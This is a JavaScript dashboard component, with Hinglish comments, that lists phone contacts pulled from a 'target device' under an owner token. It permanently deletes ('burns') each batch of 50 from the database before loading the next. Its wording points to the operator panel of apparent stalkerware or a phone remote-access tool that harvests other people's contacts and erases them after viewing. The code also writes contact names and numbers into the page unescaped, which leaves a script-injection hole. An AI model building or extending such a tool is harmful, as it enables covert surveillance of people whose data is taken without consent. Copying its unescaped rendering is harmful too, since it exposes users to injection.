class ContactsEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.currentContactsIds = []; // Current page ki IDs store karne ke liye
        this.init();
    }

    async init() {
        const container = document.getElementById('contacts-list');
        if (!container) return;

        if (!this.activeDeviceId) {
            container.innerHTML = '<p style="color: #d32f2f;">Target Device ID missing. Please select a device.</p>';
            return;
        }
        
        // Add container for the Next button if it doesn't exist
        if (!document.getElementById('pagination-controls')) {
            const controls = document.createElement('div');
            controls.id = 'pagination-controls';
            controls.style.marginTop = '20px';
            controls.style.textAlign = 'center';
            container.parentNode.insertBefore(controls, container.nextSibling);
        }

        this.fetchContacts();
    }

    async fetchContacts() {
        const token = localStorage.getItem('owner_token');
        const container = document.getElementById('contacts-list');
        const controls = document.getElementById('pagination-controls');
        
        container.innerHTML = '<p style="color:#aaa;">Loading secure contacts stream...</p>';
        controls.innerHTML = '';

        try {
            const res = await fetch(`/api/contacts?device_id=${this.activeDeviceId}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();

            if (result.status === 'success') {
                if (result.data.length === 0) {
                    container.innerHTML = '<p style="color:#aaa;">No contacts available. Waiting for device sync payload...</p>';
                    return;
                }

                // 🚀 Memory me IDs save karo taaki next page par unhe delete kiya ja sake
                this.currentContactsIds = result.data.map(c => c.id);

                container.innerHTML = result.data.map(c => `
                    <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 6px; margin-bottom: 8px; border-left: 4px solid #27ae60;">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <strong style="font-size: 1.1rem;">${c.name}</strong>
                            <span style="color:#2ecc71; font-family:monospace; font-size: 1rem;">${c.phone_number}</span>
                        </div>
                    </div>
                `).join('');

                // Agar exactly 50 contacts aaye hain, toh matlab aur bhi ho sakte hain DB me
                if (result.data.length === 50) {
                    controls.innerHTML = `
                        <button id="next-chunk-btn" style="background:#d32f2f; color:white; padding:10px 20px; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">
                            Delete These & Load Next 50
                        </button>
                    `;
                    document.getElementById('next-chunk-btn').addEventListener('click', () => this.loadNextPageAndBurn());
                }
            }
        } catch (e) {
            console.error("Contacts Fetch Error:", e);
            container.innerHTML = '<p style="color: #d32f2f;">Network Error: Failed to fetch contacts.</p>';
        }
    }

    async loadNextPageAndBurn() {
        const isConfirmed = confirm("This action will permanently delete these 50 contacts from the database to load the next chunk. Proceed?");
        if (!isConfirmed) return;

        const token = localStorage.getItem('owner_token');
        const nextBtn = document.getElementById('next-chunk-btn');
        if (nextBtn) nextBtn.innerText = "Burning old data...";

        try {
            // 1. Burn (Delete) the current 50 contacts from Supabase
            if (this.currentContactsIds.length > 0) {
                await fetch('/api/contacts/burn', {
                    method: 'POST',
                    headers: { 
                        'Authorization': `Bearer ${token}`, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({
                        device_id: this.activeDeviceId,
                        contact_ids: this.currentContactsIds
                    })
                });
            }

            // 2. Fetch the newly shifted Top 50 records
            this.fetchContacts();

        } catch (e) {
            console.error("Burn Engine Error:", e);
            alert("Failed to process the next chunk.");
            if (nextBtn) nextBtn.innerText = "Delete These & Load Next 50";
        }
    }
}

document.addEventListener('DOMContentLoaded', () => new ContactsEngine());
